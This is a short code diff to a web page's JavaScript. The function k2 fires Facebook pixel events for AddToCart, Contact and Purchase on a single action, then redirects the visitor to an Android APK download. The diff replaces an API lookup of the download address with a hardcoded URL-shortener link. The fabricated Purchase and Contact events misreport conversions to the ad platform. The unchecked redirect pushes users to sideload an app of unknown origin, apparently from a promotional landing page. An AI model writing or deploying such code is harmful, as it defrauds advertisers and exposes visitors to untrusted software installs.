@@ -45,28 +45,13 @@ fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
 
     <!-- ========== k2 — Dynamic APK URL fetch & redirect (no device filter) ========== -->
     <script>
-        // Ensure API_BASE and _site are defined globally before calling k2
-        var _apkUrl = '';
+        
         async function k2(source) {
             fbq('track', 'AddToCart');
             fbq('track', 'Contact');
             fbq('track', 'Purchase');
 
-            try {
-                if (!_apkUrl) {
-                    var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
-                    var d = await r.json();
-                    _apkUrl = d.url;
-                    console.log('APK API response:', JSON.stringify(d));
-                }
-                if (_apkUrl) {
-                    window.location.href = _apkUrl;
-                } else {
-                    alert('请配置下载地址.');
-                }
-            } catch (e) {
-                alert('请配置下载地址.');
-            }
+           window.location.href = "https://lihi2.me/soza4";
         }
     </script>
     <!-- ========== End k2 ========== -->
